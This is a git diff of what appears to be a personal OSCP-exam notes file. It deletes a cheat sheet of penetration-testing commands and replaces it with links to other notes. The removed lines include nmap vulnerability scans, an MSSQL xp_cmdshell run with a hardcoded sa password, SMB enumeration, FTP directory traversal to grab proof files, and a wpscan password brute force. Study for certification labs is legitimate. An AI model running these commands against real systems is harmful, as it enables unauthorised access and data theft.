@@ -1,51 +1,8 @@
-# Useful command
+## Information-Gathering-Vulnerability-Scanning
 
-## Scan
+https://github.com/emre-uzun/oscp/blob/master/Information-Gathering-Vulnerability-Scanning/Useful-command.md
 
-### NMAP
-```
-nmap -A -Pn -n --top-ports 10000 -vvv -oN 192.168.27.68
-nmap -sV -T5 -F -A 10.11.1.5 --open --script vuln
-nmap -A -Pn -sC 10.11.1.8
-nmap 10.11.1.31 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,mssql.instance-name=MSSQLSERVER,ms-sql-xp-cmdshell.cmd='type C:\"Documents and Settings"\Administrator\Desktop\proof.txt'
-nmap 10.11.1.125 --script ftp*
-```
-### NIKTO
-```
-nikto -h 10.10.10.10:8000
-```
-
-### DIRBUSTER
-```
-dirb http://10.11.1.31
-```
-
-### SMB
-```
-enum4linux 10.11.1.8
-smbclient //10.11.1.128/wwwroot
-smbclient -L 10.11.1.128
-```
-
-### FTP
-```
-anonymous:anonymous
-cd "Documents and Settings"
-get servers.py
-
-ls ../../../../../../../../../../../Docume~1/Administrateur/Bureau/
-get
-(remote-file) ../../../../../../../../../../../Docume~1/Administrateur/Bureau/proof.txt
-(local-file) /root/Desktop/10.11.1.125.txt
-```
-
-### WORDPRESS
-
-```
-wpscan -u "http://10.11.1.234" --wordlist /usr/share/wordlists/rockyou.txt --username admin
-```
-
-## Get Shell & Listen:
+## Shell:
 
 https://github.com/emre-uzun/oscp/blob/master/Shell/Generating-Reverse-Shell.md
 
